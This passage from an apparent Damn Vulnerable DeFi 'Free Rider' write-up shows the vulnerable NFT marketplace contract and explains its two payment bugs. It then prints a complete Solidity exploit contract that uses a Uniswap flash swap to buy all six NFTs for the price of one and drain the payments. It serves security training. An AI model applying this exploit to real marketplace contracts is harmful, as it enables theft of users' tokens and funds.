</span></span><span style="display:flex;"><span>            <span style="color:#000">token</span>.<span style="color:#000">safeMint</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>);
</span></span><span style="display:flex;"><span>        }        
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">offerMany</span>(<span style="color:#00f">uint256</span>[] <span style="color:#000">calldata</span> <span style="color:#000">tokenIds</span>, <span style="color:#00f">uint256</span>[] <span style="color:#000">calldata</span> <span style="color:#000">prices</span>) <span style="color:#00f">external</span> <span style="color:#000">nonReentrant</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">tokenIds</span>.<span style="color:#000">length</span> &gt; <span style="color:#3af">0</span> &amp;&amp; <span style="color:#000">tokenIds</span>.<span style="color:#000">length</span> == <span style="color:#000">prices</span>.<span style="color:#000">length</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#00f">for</span> (<span style="color:#00f">uint256</span> <span style="color:#000">i</span> = <span style="color:#3af">0</span>; <span style="color:#000">i</span> &lt; <span style="color:#000">tokenIds</span>.<span style="color:#000">length</span>; <span style="color:#000">i</span>++) {
</span></span><span style="display:flex;"><span>            <span style="color:#000">_offerOne</span>(<span style="color:#000">tokenIds</span>[<span style="color:#000">i</span>], <span style="color:#000">prices</span>[<span style="color:#000">i</span>]);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">_offerOne</span>(<span style="color:#00f">uint256</span> <span style="color:#000">tokenId</span>, <span style="color:#00f">uint256</span> <span style="color:#000">price</span>) <span style="color:#00f">private</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">price</span> &gt; <span style="color:#3af">0</span>, <span style="color:#5a2">&#34;Price must be greater than zero&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#000">msg</span>.<span style="color:#000">sender</span> == <span style="color:#000">token</span>.<span style="color:#000">ownerOf</span>(<span style="color:#000">tokenId</span>),
</span></span><span style="display:flex;"><span>            <span style="color:#5a2">&#34;Account offering must be the owner&#34;</span>
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#000">token</span>.<span style="color:#000">getApproved</span>(<span style="color:#000">tokenId</span>) == <span style="color:#00f">address</span>(<span style="color:#000">this</span>) ||
</span></span><span style="display:flex;"><span>            <span style="color:#000">token</span>.<span style="color:#000">isApprovedForAll</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#00f">address</span>(<span style="color:#000">this</span>)),
</span></span><span style="display:flex;"><span>            <span style="color:#5a2">&#34;Account offering must have approved transfer&#34;</span>
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">offers</span>[<span style="color:#000">tokenId</span>] = <span style="color:#000">price</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">amountOfOffers</span>++;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">emit</span> <span style="color:#000">NFTOffered</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">tokenId</span>, <span style="color:#000">price</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">buyMany</span>(<span style="color:#00f">uint256</span>[] <span style="color:#000">calldata</span> <span style="color:#000">tokenIds</span>) <span style="color:#00f">external</span> <span style="color:#00f">payable</span> <span style="color:#000">nonReentrant</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#00f">for</span> (<span style="color:#00f">uint256</span> <span style="color:#000">i</span> = <span style="color:#3af">0</span>; <span style="color:#000">i</span> &lt; <span style="color:#000">tokenIds</span>.<span style="color:#000">length</span>; <span style="color:#000">i</span>++) {
</span></span><span style="display:flex;"><span>            <span style="color:#000">_buyOne</span>(<span style="color:#000">tokenIds</span>[<span style="color:#000">i</span>]);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">_buyOne</span>(<span style="color:#00f">uint256</span> <span style="color:#000">tokenId</span>) <span style="color:#00f">private</span> {       
</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">priceToPay</span> = <span style="color:#000">offers</span>[<span style="color:#000">tokenId</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">priceToPay</span> &gt; <span style="color:#3af">0</span>, <span style="color:#5a2">&#34;Token is not being offered&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">msg</span>.<span style="color:#000">value</span> &gt;= <span style="color:#000">priceToPay</span>, <span style="color:#5a2">&#34;Amount paid is not enough&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">amountOfOffers</span>--;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// transfer from seller to buyer
</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#000">token</span>.<span style="color:#000">safeTransferFrom</span>(<span style="color:#000">token</span>.<span style="color:#000">ownerOf</span>(<span style="color:#000">tokenId</span>), <span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">tokenId</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// pay seller
</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">payable</span>(<span style="color:#000">token</span>.<span style="color:#000">ownerOf</span>(<span style="color:#000">tokenId</span>)).<span style="color:#000">sendValue</span>(<span style="color:#000">priceToPay</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">emit</span> <span style="color:#000">NFTBought</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">tokenId</span>, <span style="color:#000">priceToPay</span>);
</span></span><span style="display:flex;"><span>    }    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">receive</span>() <span style="color:#00f">external</span> <span style="color:#00f">payable</span> {}
</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
</div>
</div></p>
<p>It&rsquo;s the main contract of the challenge.</p>
<ul>
<li><code>constructor</code>:
<ul>
<li>it mints some tokens inside the constructor (lines <code>25-32</code>), that, according to the project setup are <code>6</code> NFTs (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/free-rider/free-rider.challenge.js#L77" target="_blank" rel="noopener noreffer ">setup</a>)</li>
</ul>
</li>
<li><code>offersMany</code>:
<ul>
<li>prevents reentrancy by using the <code>nonReentrant</code> modifier</li>
<li>checks if the token array has the same length for the prices array (i.e. if each token has a corresponding price) - line <code>35</code></li>
<li>calls <code>_offerOne</code> with each token ID and the corresponsign price (lines <code>36-38</code>)</li>
</ul>
</li>
<li><code>_offersOne</code> (<code>private</code> function):
<ul>
<li>checks if the token price is <code>&gt;0</code> (line <code>42</code>) and if the <code>msg.sender</code> is the owner of the token offered (lines <code>44-47</code>)</li>
<li>checks if the token transfer has been approved (lines <code>49-53</code>)</li>
<li>updates the <code>offers</code> variable with the token ID and its corresponding price (line <code>55</code>) and increments the <code>amountOfOffers</code> counter (line <code>57</code>)</li>
</ul>
</li>
<li><code>buyMany</code>:
<ul>
<li>prevents reentrancy by using the <code>nonReentrant</code> modifier</li>
<li>for each token ID in <code>tokenIds</code> parameter, it calls the private function <code>_buyOne</code> (line <code>64</code>)</li>
</ul>
</li>
<li><code>_buyOne</code>:
<ul>
<li>gets the price to pay for the corresponding token (line <code>69</code>)</li>
<li>checks if the price to pay is <code>&gt;0</code>, meaning that there is an offer for that token (line <code>70</code>)</li>
<li>checks if the <code>msg.value</code> is <code>&gt;=</code> than the amount to pay (line <code>72</code>)</li>
<li>decrements the <code>amountOfOffers</code> counter (line <code>74</code>)</li>
<li>transfers the token from the current owner to <code>msg.sender</code> by calling <code>safeTransferFrom</code> (line <code>77</code>)</li>
<li>sends the price to pay to  the NFT owner (line <code>80</code>), which should be the seller</li>
</ul>
</li>
</ul>
<p>The vulnerable function is <code>_buyOne</code>; in particular, there are <code>2</code> bugs in this function:</p>
<ol>
<li>the token seller will never receive the amount because the <code>sendValue</code> function (line <code>80</code>) is called after the token ownership is transferred (line <code>77</code>). It means that the new owner of the token will also receive the amount offered for that token</li>
<li><code>msg.value</code> is checked only for a single token offer (line <code>72</code>)  and not for the total amount of offers. Since <code>_buyOne</code> is executed inside a loop, if an attacker has at least the balance for the maximum token price, they can take ownership of all the tokens even if the sum of all their prices is greater. Since the NFT price is <code>15 ETH</code>, we need at least <code>15 ETH</code> to steal all the NFT (instead of <code>15*6=90 ETH</code>).</li>
</ol>
<div class="details admonition question open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">How can we obtain some ETH to buy the NFT tokens?</div>
        </div>
    </div>
<p>We start with <code>0.5 ETH</code> balance but we need at least <code>15 ETH</code> to take all the tokens successfully. If we take a closer look at the challenge <a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/free-rider/free-rider.challenge.js" target="_blank" rel="noopener noreffer ">setup file</a>, we can see that a UniswapV2 pair is deployed. After some research, I found that we can request flash swaps (i.e. flash loans). Using flash swaps, we can request the amount needed to perform the attack as long as we pay the amount back plus an additional fee of <code>~0.3%</code>.</p>
<h2 id="3-solution">3) Solution</h2>
<p>The solution consists of the following steps:</p>
<ul>
<li>swap <code>15 WETH</code> using the Uniswap pair</li>
<li>to receive the flash loan, we need to implement the <code>uniswapV2Call</code> function</li>
<li>insider the <code>uniswapV2Call</code> function, withdraw the <code>15 ETH</code></li>
<li>call the <code>buyMany</code> function by providing the list of tokens IDs (i.e. <code>0,1,2,3,4,5</code>) with an offer of <code>15 ETH</code> each</li>
<li>deposit back the amount requested plus an additional fee of <code>~0.3%</code></li>
<li>once the execution of <code>uniswapV2Call</code> is completed, we can transfer all the tokens to the buyer and the ETH we obtained from selling the tokens to our attacker address (even if it&rsquo;s not needed to solve this challenge)</li>
</ul>
<p><code>AttackFreeRider.sol</code>:
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888;font-style:italic">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span><span style="color:#888;font-style:italic">/**
</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"> * @title AttackFreeRider
</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">AttackFreeRider</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">IUniswapV2Factory</span> <span style="color:#000">factory</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#000">IMarketplace</span> <span style="color:#000">marketplace</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00f">address</span> <span style="color:#000">TOKEN</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00f">address</span> <span style="color:#000">WETH</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00f">uint256</span> <span style="color:#000">price</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">uint256</span> <span style="color:#000">_price</span>, <span style="color:#00f">address</span> <span style="color:#000">_factory</span>, <span style="color:#00f">address</span> <span style="color:#000">_marketplace</span>, <span style="color:#00f">address</span> <span style="color:#000">_token</span>, <span style="color:#00f">address</span> <span style="color:#000">_weth</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#000">factory</span> = <span style="color:#000">IUniswapV2Factory</span>(<span style="color:#000">_factory</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#000">marketplace</span> = <span style="color:#000">IMarketplace</span>(<span style="color:#000">_marketplace</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#000">TOKEN</span> = <span style="color:#000">_token</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#000">WETH</span> = <span style="color:#000">_weth</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#000">price</span> = <span style="color:#000">_price</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">run</span>(<span style="color:#00f">address</span> <span style="color:#000">_attacker</span>, <span style="color:#00f">address</span> <span style="color:#000">_buyer</span>) <span style="color:#00f">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#00f">address</span> <span style="color:#000">pair</span> = <span style="color:#000">factory</span>.<span style="color:#000">getPair</span>(<span style="color:#000">TOKEN</span>, <span style="color:#000">WETH</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#00f">bytes</span> <span style="color:#00f">memory</span> <span style="color:#000">data</span> = <span style="color:#000">abi</span>.<span style="color:#000">encode</span>(<span style="color:#000">WETH</span>, <span style="color:#000">price</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">IUniswapV2Pair</span>(<span style="color:#000">pair</span>).<span style="color:#000">swap</span>(<span style="color:#000">price</span>, <span style="color:#3af">0</span>, <span style="color:#00f">address</span>(<span style="color:#000">this</span>), <span style="color:#000">data</span>);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// send tokens to buyer and receive ETH reward
</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">for</span> (<span style="color:#00f">uint</span> <span style="color:#000">i</span>=<span style="color:#3af">0</span>; <span style="color:#000">i</span>&lt;<span style="color:#3af">6</span>; <span style="color:#000">i</span>++) {
</span></span><span style="display:flex;"><span>            <span style="color:#000">INFT</span>(<span style="color:#000">marketplace</span>.<span style="color:#000">token</span>()).<span style="color:#000">safeTransferFrom</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>), <span style="color:#000">_buyer</span>, <span style="color:#000">i</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// send all the ETH received to the attacker address
</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        (<span style="color:#00f">bool</span> <span style="color:#000">success</span>,) = <span style="color:#000">_attacker</span>.<span style="color:#000">call</span>{<span style="color:#000">value</span>: <span style="color:#00f">address</span>(<span style="color:#000">this</span>).<span style="color:#000">balance</span>}(<span style="color:#5a2">&#34;&#34;</span>);   
</span></span><span style="display:flex;"><span>        <span style="color:#000">assert</span>(<span style="color:#000">success</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">uniswapV2Call</span>(<span style="color:#00f">address</span>, <span style="color:#00f">uint</span>, <span style="color:#00f">uint</span>, <span style="color:#00f">bytes</span> <span style="color:#000">calldata</span>) <span style="color:#00f">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#00f">address</span> <span style="color:#000">token0</span> = <span style="color:#000">IUniswapV2Pair</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>).<span style="color:#000">token0</span>(); 
</span></span><span style="display:flex;"><span>        <span style="color:#00f">address</span> <span style="color:#000">token1</span> = <span style="color:#000">IUniswapV2Pair</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>).<span style="color:#000">token1</span>(); 
</span></span><span style="display:flex;"><span>        <span style="color:#000">assert</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span> == <span style="color:#000">factory</span>.<span style="color:#000">getPair</span>(<span style="color:#000">token0</span>, <span style="color:#000">token1</span>)); 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// deposit WETH to get (15) ETH
</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#000">IWETH</span>(<span style="color:#000">token0</span>).<span style="color:#000">withdraw</span>(<span style="color:#000">price</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint</span>[] <span style="color:#00f">memory</span> <span style="color:#000">tokenIds</span> = <span style="color:#00f">new</span> <span style="color:#00f">uint</span>[](<span style="color:#3af">6</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#00f">for</span> (<span style="color:#00f">uint</span> <span style="color:#000">i</span>=<span style="color:#3af">0</span>; <span style="color:#000">i</span>&lt;<span style="color:#000">tokenIds</span>.<span style="color:#000">length</span>; <span style="color:#000">i</span>++) {
</span></span><span style="display:flex;"><span>            <span style="color:#000">tokenIds</span>[<span style="color:#000">i</span>] = <span style="color:#000">i</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// offer 15 ETH for each token
</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#000">marketplace</span>.<span style="color:#000">buyMany</span>{<span style="color:#000">value</span>: <span style="color:#000">price</span>}(<span style="color:#000">tokenIds</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// amount + fee
</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">uint256</span> <span style="color:#000">amount</span> = <span style="color:#000">price</span> + (<span style="color:#000">price</span> * <span style="color:#3af">3</span> / <span style="color:#3af">997</span>) + <span style="color:#3af">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#000">IWETH</span>(<span style="color:#000">token0</span>).<span style="color:#000">deposit</span>{<span style="color:#000">value</span>: <span style="color:#000">amount</span>}();
</span></span><span style="display:flex;"><span>        <span style="color:#000">assert</span>(<span style="color:#000">IWETH</span>(<span style="color:#000">token0</span>).<span style="color:#000">transfer</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">amount</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>    <span style="color:#000">receive</span>() <span style="color:#00f">external</span> <span style="color:#00f">payable</span> {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">onERC721Received</span>(<span style="color:#00f">address</span>, <span style="color:#00f">address</span>, <span style="color:#00f">uint256</span>, <span style="color:#00f">bytes</span> <span style="color:#00f">memory</span>) <span style="color:#00f">external</span> <span style="color:#00f">pure</span> <span style="color:#00f">returns</span> (<span style="color:#00f">bytes4</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">this</span>.<span style="color:#000">onERC721Received</span>.<span style="color:#000">selector</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
</div>
</div></p>
<p><code>free-rider.challenge.js</code>:
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
